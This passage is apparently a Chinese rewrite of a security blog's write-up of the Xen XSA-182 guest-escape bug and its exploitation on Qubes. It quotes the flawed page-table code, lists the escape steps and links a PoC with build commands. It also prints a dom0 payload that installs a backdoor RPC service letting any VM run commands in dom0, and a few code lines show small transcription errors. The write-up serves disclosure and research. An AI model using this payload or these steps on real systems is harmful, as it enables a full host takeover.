### 优化后的文本

#### 代码解释
作为标志的一部分，同样被认为是安全的:
```c
/* Update the L4 entry at pl4e to new value nl4e. pl4e is within frame pfn. */
static int mod_l4_entry(l4_pgentry_t *pl4e,
                        l4_pgentry_t nl4e,
                        unsigned long pfn,
                        int preserve_ad,
                        struct vcpu *vcpu)
{
    struct domain *d = vcpu->domain;
    l4_pgentry_t ol4e;
    int rc = 0;

    if (unlikely(!is_guest_l4_slot(d, pgentry_ptr_to_slot(pl4e)))) {
        MEM_LOG("Illegal L4 update attempt in Xen-private area %p", pl4e);
        return -EINVAL;
    }

    if (unlikely(__copy_from_user(&ol4e, pl4e, sizeof(ol4e)) != 0))
        return -EFAULT;

    if (l4e_get_flags(nl4e) & _PAGE_PRESENT) {
        if (unlikely(l4e_get_flags(nl4e) & L4_DISALLOW_MASK)) {
            MEM_LOG("Bad L4 flags %x", l4e_get_flags(nl4e) & L4_DISALLOW_MASK);
            return -EINVAL;
        }

        /* Fast path for identical mapping and presence. */
        if (!l4e_has_changed(ol4e, nl4e, _PAGE_PRESENT)) {
            adjust_guest_l4e(nl4e, d);
            rc = UPDATE_ENTRY(l4, pl4e, ol4e, nl4e, pfn, vcpu, preserve_ad);
            return rc ? 0 : -EFAULT;
        }
    }
}
```
这段代码在条目及 `PRESENT` 标志不变时使用快速路径，允许我们在自映射条目中设置 `RW` 标志。具体步骤如下：
1. 创建不带 `RW` 标志的自映射条目。
2. 通过快速路径添加 `RW` 标志。
3. 以写权限访问页目录。
4. 实现虚拟机逃逸。

下面的方案说明了在条目42上的内存映射:
```
VADDR : (42 +-------------+42|L4, RW, U, P |--+
                   |.............|
                   |.............|
                511|.............|
                   +-------------+
```

#### 利用
利用情况与 XSA-148 案例完全相同：
1. 遍历整个宿主机内存。
2. 寻找页目录。
3. 通过 `start_info` 结构定位 `dom0`。
4. 找到 `vDSO` 页并进行补丁。
5. 在 `dom0` 中获取 root shell。

如前所述，我们决定在 Qubes 系统中利用此漏洞。如果你对 Qubes 不太了解，以下是一些基本信息：

**Qubes 操作系统是什么？**
Qubes 是一个安全的操作系统（OS），它运行在计算机上以支持其他所有程序。一些流行的操作系统包括微软的 Windows、苹果的 OS X、安卓和 iOS。Qubes 是自由且开源的（FOSS），这意味着每个人都可以自由使用、复制并以任何方式修改软件。其源代码是公开的，任何人都可以贡献代码和进行审计。

**Qubes 系统如何保证安全？**
Qubes 使用“安全隔离”的方法，允许用户将其数字生活的各个部分隔离到安全分离的虚拟机中（VMs）。虚拟机基本上是在物理计算机上运行的模拟计算机，具有自己的操作系统。你可以将虚拟机视为一台计算机内的另一台计算机。

Qubes 系统使用 Xen 管理器来管理这些隔离的虚拟机。如果攻击者能在其虚拟机中从 Qubes 的 `dom0` 执行代码，则系统不能保证任何安全。虽然在 `dom0` 中执行代码已经实现，但由于 Qubes 提供了防火墙，我们不能使用经典的 netcat，必须换一个载体。

看看 Qubes RPC 服务。RPC 服务允许 Qubes 系统中的虚拟机之间进行通信，例如剪切板、文件拷贝等。每个服务都有指定的源虚拟机、目标虚拟机以及请求策略（允许、拒绝或询问）。

我们的想法是在 `dom0` 环境中执行一段代码来添加一个 RPC 服务。我们可以使用 scumjr 的方法优雅地实现这一点：
```python
;;      mov     rcx, rip+8
lea     rcx, [rel $ +8]
ret
db '-cimport os;x=open("/tmp/.x", "w");x.close();'
db 'service=open("/etc/qubes_backdoor", "w");'
db 'service.write("#!/bin/bashn");'
db 'service.write("read arg1n");'
db 'service.write("($arg1)n");'
db 'service.close();'
db 'os.system("chmod +x /etc/qubes_backdoor");'
db 'rpc=open("/etc/qubes-rpc/qubes.Backdoor", "w");'
db 'rpc.write("/etc/qubes_backdoorn");'
db 'rpc.close();'
db 'policy=open("/etc/qubes-rpc/policy/qubes.Backdoor", "w");'
db 'policy.write("$anyvm dom0 allow");'
db 'policy.close();'
db      0
```
这增加了一个名为 `qubes` 的服务，后门会执行每一个给定的命令。

由于此漏洞一周前刚刚披露，我们不想今天就发布完整的利用代码，以免给用户带来风险。但我们提供了一份 Xen 漏洞的 PoC：[xsa-182-poc.tar.gz](http://blog.quarkslab.com/resources/2016-08-04-xen_exploitation_part_3_xsa_148/xsa-182-poc.tar.gz)。

使用方法：
```sh
$ tar xzvf xsa-182-poc.tar.gz
$ make -C xsa-182-poc/
$ sudo insmod xsa-182-poc/xsa-182-poc.ko
$ sudo rmmod xsa-182-poc
$ dmesg | grep xsa-182
```

如果你使用的是有漏洞的 Qubes 版本，可以通过 Qubes 虚拟机管理器升级 `dom0` 软件，或使用以下命令：
```sh
$ sudo qubes-dom0-update
```

#### 硬件虚拟化和虚拟机管理程序的安全性
在 CanSecWest 2010 上，Julien Tinnès 和 Tavis Ormandy 在《Virtualisation security》和《Intel privilege model》演讲中解释了虚拟化的不同类型，并指出了开发安全 hypervisor 所面临的挑战。事实上，半虚拟化非常复杂，类似于二进制翻译。处理所有细节使其像一个真正的 CPU 很困难。半虚拟化错误通常会导致客户机提权或客户机逃逸。在没有硬件虚拟化的情况下，二进制翻译和半虚拟化是强制性的，但 Intel VT-x 和 AMD SVM 技术的推出改变了这种情况。

由于一些新增的 CPU 指令，硬件虚拟化使 hypervisor 的开发变得更加容易和安全。二级地址翻译（Intel 的 EPT 和 AMD 的 RVI）可以避免影子页表的复杂性。我们认为半虚拟化和硬件虚拟化的客户机之间没有显著差异，尽管我们没有一个标准。

此外，基于硬件虚拟化的 hypervisor 安全性还可以继续提高。谷歌采取的减少 KVM 攻击面的方法似乎很有吸引力。许多功能被移到用户空间，因此可以很容易地放在沙盒中。设备的模拟会引入巨大的攻击面，KVM 与 Xen 不同，似乎不能在非可信虚拟机中隔离设备。

#### 结论
半虚拟化确实很难保证安全。它引入了非常复杂的代码，并且有很多安全问题。Qubes 系统决定从 4.0 版开始强制使用硬件虚拟化，去除半虚拟化。我们相信这是一个明智的决定，因为硬件虚拟化的安全问题较少。

最近我们又发现了一个影响半虚拟化客户机的漏洞，能使客户机逃逸到宿主机。然而，我们认为不需要再写一篇博文，因为这个漏洞与本文描述的漏洞非常相似。

希望你喜欢这三篇关于 Xen 的文章！感谢每一位为这些文章做出贡献的人。